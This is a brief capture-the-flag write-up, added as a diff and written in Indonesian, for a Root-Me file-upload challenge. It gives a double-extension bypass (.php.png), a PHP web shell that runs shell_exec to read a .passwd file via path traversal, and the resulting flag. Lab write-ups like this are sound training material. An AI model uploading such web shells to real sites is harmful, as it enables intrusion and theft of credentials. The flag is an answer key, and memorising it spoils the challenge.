@@ -1,0 +1,21 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch20/
+
+	Challenge's Name : File upload - double extensions
+	
+	Request Your goal is to hack this photo galery by uploading PHP code. Retrieve the validation password in the file .passwd.
+	
+	Solusi : 
+	
+	Buat file php dengan extensi nama_file.php.png / jpeg / gif
+	
+	<?php
+		$output = shell_exec('cat ../../../.passwd');
+		echo "<pre>$output</pre>";
+	?>
+	
+	Upload file tersebut pada link 
+	http://challenge01.root-me.org/web-serveur/ch20/?action=upload
+	
+	setelah terupload akses url yg diberikan akan mendapatkan flag
+	
+	Flag : PV1OejHY4MxfsC2mHpRz9
